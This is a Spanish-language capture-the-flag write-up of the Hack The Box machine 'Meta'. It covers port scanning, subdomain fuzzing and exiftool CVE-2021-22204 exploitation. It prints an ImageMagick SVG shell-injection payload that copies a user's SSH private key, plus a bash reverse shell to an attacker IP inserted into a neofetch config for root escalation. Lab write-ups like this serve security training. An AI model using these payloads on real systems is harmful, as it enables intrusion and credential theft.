---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Meta               |
| Os                     | Linux              |
| Difficulty             | Medium             |
| Points                 | 30                 |
| IP                     | 10.10.11.140       |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Meta/scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.140
```

![nmap 1](/assets/images/Meta/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.140 -oG allPorts
```

![nmap 2](/assets/images/Meta/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80 10.10.11.140 -oN targeted
```

![nmap 3](/assets/images/Meta/nmap3.png)


Encontramos en nuestro escaneo un virtual host `http://artcorp.htb`, asi que procedemos a agregarlo a nuestro /etc/hosts.

Procederemos a listar los directorios con gobuster:

```s
gobuster dir --url http://artcorp.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --no-error -t 20
```

![Gobuster](/assets/images/Meta/gobuster.png)

```s
ffuf -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.artcorp.htb" -ac -c
```

![ffuf](/assets/images/Meta/ffuf.png)

Despues de la busquedad de mas informcion ffuf es quien encontro un subdominio, lo agregaremos en nuestro /etc/hosts tambien, etse nos permitio observar mas sobre lo que hay dentro.

A simple vista, parece que es una pagina encargada de analizar la meta data, esta es procesada por linux con un exiftool, asi que cargaremos una imagen para ver el resultado.

![MetaView](/assets/images/Meta/metaview.png)

Recientemente se encontro una vulnerabilidad en exiftool en versiones anteriores a la 12.24, permite a los atacantes ejecusion remota al cargar una imagen. Para este caso, usaremos una <a href="https://github.com/convisolabs/CVE-2021-22204-exiftool.git">herramienta</a> en github, en la cual se crea una imagen y nosotros tendremos que cambiarle la IP, Puerto y nos generara nuestra shell, solamente tendremos ahora que ponernos en escucha para ejecutar la shell.

![Access](/assets/images/Meta/access.png)

Echando un vistaso mas a fondo de la aplicacion, parece que utiliza mogrify para transformar las imagenes a png, que a su ves esta ligado a Imagick , mas informacion en el siguiente<a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">link</a>

Entonces lo que haremos, es descargarnos este script, para modificarlo a nuestro antojo, en este caso tomaremos la llave privada de thomas para conectarnos por ssh con sus credenciales y poder despues leer la flag.

```html
#proc.svg
<image authenticate='ff" `echo $(/home/thomas/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Abrimos un http server con python para mandarlo a la victima.

```s
sudo python3 -m http.server 80
```

Lo descargamos en la maquina victima en /var/www/dev01.artcorp.htb/convert_images/

```s
wget http://10.10.14.230/poc.svg
```

Despues nos pasamos a /dev/shm y podremos ahora leer la id_rsa, la copiamos a nuestra maquina, le damos formato y nos conectamos.

Una vez dentro, para checar nuestros privilegios usamos:

```s
sudo -l
```

Y vemos que somos capaces de ejecutar unos comandos. Asi que ahora cambiaremos su valor con:

```s
export XDG_CONFIG_HOME='/home/thomas/.config'
```

dentro de este path, editaremos el archivo de neofetch/config.conf y le insertaremos una shell

```s
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.230/4444 0>&1"
```

Nos ponemos en escucha en nuestra maquina en el puerto 4444 y lo ejecutamos con:

```s
sudo -u root /usr/bin/neofetch \"\"
```

![Root](/assets/images/Meta/root.png)

![Powned](/assets/images/Meta/pwned.png)